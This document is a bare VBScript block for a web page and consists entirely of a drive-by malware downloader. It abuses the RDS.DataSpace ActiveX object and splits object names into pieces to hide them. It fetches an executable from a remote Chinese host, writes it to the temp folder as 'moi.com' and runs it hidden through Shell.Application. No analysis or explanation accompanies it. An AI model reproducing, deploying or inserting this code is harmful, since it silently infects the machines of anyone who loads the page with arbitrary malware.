<script language="VBScript">
    on error resume next
    str6="object"
    str7="classid"
    c1="clsid:BD96C556-"
    c2="65A3-11D0-983A-"
    c3="00C04F"
    c4="C29E36"
    str8=c1&c2&c3&c4
    str9=str8
    Set dfile = document.createElement(str6)
    dfile.setAttribute str7, str9
    d1="Micros"
    d2="oft.X"
    d3="MLH"
    d4="TTP"
    Set http = dfile.CreateObject(d1&QQ67112525&d2&F4sdTRhh&d3&d4,"")
    a1="Ad"
    a2="odb."
    a3="Str"
    a4="eam"
    set strm = dfile.createobject(a1&QQ67112525&a2&F4sdTRhh&a3&a4,"")
    strm.type = 1
    http.Open "GET", "http://www.mmoi.cn/liu/112.exe", False
    http.Send
    f1="Scri"
    f2="pting.Fil"
    f3="eSyst"
    f4="emObject"
    str13=f1&f2&f3&f4
    str12=str13
    set fso = dfile.createobject(str12,"")
    set temp = fso.GetSpecialFolder(2) 
    filename= fso.BuildPath(temp,"moi.com")
    strm.open
    strm.write http.responseBody
    strm.savetofile filename,2
    strm.close
    b1="She"
    b2="ll."
    b3="Applic"
    b4="ation"
    set exc = dfile.createobject(b1&QQ67112525&b2&F4sdTRhh&b3&b4,"")
    str4="open"
    exc.ShellExecute filename,"","",str4,0
    </script>
